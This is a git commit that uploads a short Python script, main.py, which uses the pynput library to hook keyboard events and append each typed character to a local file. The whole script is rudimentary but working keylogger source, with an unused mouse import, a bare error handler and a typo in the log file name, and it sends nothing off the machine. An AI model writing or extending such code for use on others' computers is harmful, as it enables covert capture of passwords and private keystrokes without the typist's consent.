89cf675482c05625f151776836e1b5281e059118
Abdullah-Hussein2 <abdallhpp5@gmail.com>
2024-08-02 16:27:53 +0300

    Add files via upload

---
+++ main.py
@@ -0,0 +1,20 @@
+from pynput import keyboard , mouse
+
+def Keypressed(key):
+    print(str(key))
+    with open("keyfile,txt" , "a") as logkey:
+        try:
+            char = key.char
+            logkey.write(char)
+        except:
+            print("error")
+
+if __name__ == "__main__":
+    listener = keyboard.Listener(on_press=Keypressed)
+    listener.start()
+    input()
+
+
+
+
+
